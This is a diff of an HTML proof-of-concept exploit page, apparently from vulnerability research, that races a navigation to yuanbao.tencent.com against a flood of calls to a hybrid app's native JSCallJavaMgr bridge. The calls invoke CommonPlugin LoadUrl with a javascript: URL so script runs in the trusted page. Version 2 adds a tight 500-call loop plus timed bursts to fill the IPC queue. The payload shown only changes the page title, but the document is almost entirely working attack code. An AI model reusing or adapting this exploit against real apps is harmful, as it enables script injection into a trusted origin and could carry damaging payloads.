@@ -1,49 +1,58 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>Race JS Inject</title></head>
+<head><meta charset="utf-8"><title>Race JS Inject v2</title></head>
 <body>
-<h2>Race - LoadUrl javascript: inject</h2>
+<h2>Race - LoadUrl javascript: inject v2</h2>
 <pre id="log" style="font-size:10px;"></pre>
 <script>
 var log = document.getElementById('log');
 function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }
 
+var js = 'javascript:void(document.title="PWNED_BY_RACE")';
 var c = 0;
-function call(module, method, param, cb) {
+
+function sendOne() {
     c++;
-    var req = { callback: cb || ('cb_' + c), module: module, method: method, param: param || {}, callId: 'c' + c };
-    window.JSCallJavaMgr.JSCallNative(JSON.stringify(req));
+    var req = JSON.stringify({
+        callback: 'cb_' + c,
+        module: 'CommonPlugin',
+        method: 'LoadUrl',
+        param: {url: js},
+        callId: 'c' + c
+    });
+    JSCallJavaMgr.JSCallNative(req);
 }
 
 function doRace() {
     if (!window.JSCallJavaMgr) { addLog('ERROR'); return; }
     addLog('URL: ' + location.href);
 
+    // 触发 navigate
     location.href = "https://yuanbao.tencent.com/";
 
-    // 极简 payload：改标题为 PWNED
-    var js = 'javascript:void(document.title="PWNED_BY_RACE")';
-
-    var delays = [0, 20, 40, 60, 80, 100, 130, 160, 200, 250, 300, 400, 500];
-    for (var d = 0; d < delays.length; d++) {
-        (function(delay) {
-            setTimeout(function() {
-                try { call('CommonPlugin', 'LoadUrl', {url: js}); } catch(e) {}
-            }, delay);
-        })(delays[d]);
+    // Phase 1: 同步紧凑循环，最快速度塞满 IPC 队列
+    for (var i = 0; i < 500; i++) {
+        try { sendOne(); } catch(e) { addLog('loop break at ' + i); break; }
     }
 
-    var iv = 0;
-    var t = setInterval(function() {
-        iv++;
-        try { call('CommonPlugin', 'LoadUrl', {url: js}); } catch(e) { clearInterval(t); }
-        if (iv > 200) clearInterval(t);
-    }, 0);
+    // Phase 2: setTimeout 后备，覆盖更晚的竞态窗口
+    for (var d = 0; d <= 500; d += 50) {
+        (function(delay) {
+            setTimeout(function() {
+                for (var j = 0; j < 50; j++) {
+                    try { sendOne(); } catch(e) { return; }
+                }
+            }, delay);
+        })(d);
+    }
 
-    addLog('Race started');
+    addLog('Phase1: ' + c + ' calls sent');
 }
 
-setTimeout(function() { setTimeout(doRace, 2000); }, 500);
+setTimeout(function() {
+    addLog('Starting in 2s...');
+    setTimeout(doRace, 2000);
+}, 500);
 </script>
 </body>
 </html>
